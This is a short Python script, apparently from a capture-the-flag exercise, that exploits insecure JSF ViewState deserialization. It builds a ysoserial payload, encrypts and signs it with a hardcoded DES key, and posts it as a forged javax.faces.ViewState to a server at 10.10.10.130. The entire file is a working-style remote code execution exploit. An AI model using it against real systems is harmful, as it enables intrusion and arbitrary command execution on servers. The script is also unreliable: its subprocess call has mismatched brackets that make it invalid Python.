import requests
import subprocess
import sys
from base64 import b64encode
from Crypto.Cipher import DES
from Crypto.Hash import SHA, HMAC
from os import devnull
from urllib.parse import quote_plus as urlencode

with open(devnull, 'w') as null:
    payload = subprocess.check_output(['java -jar ysoserial.jar', sys.argv[1], sys.argv[2], stderr=null)

pad = (8 - (len(payload) % 8)) % 8 
padded = payload + (chr(pad)*pad).encode()

d = DES.new(b'JsF9876-', DES.MODE_ECB)
enc_payload = d.encrypt(padded)
sig = HMAC.new(b'JsF9876-', enc_payload, SHA).digest()
viewstate = b64encode(enc_payload + sig)

sess = requests.Session()
sess.get('http://10.10.10.130:8080/userSubscribe.faces')
resp = sess.post('http://10.10.10.130:8080/userSubscribe.faces',
    data={'j_id_jsp_1623871077_1%3Aemail': 'd',
          'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+up',
          'j_id_jsp_1623871077_1_SUBMIT': '1',
          'javax.faces.ViewState': viewstate})
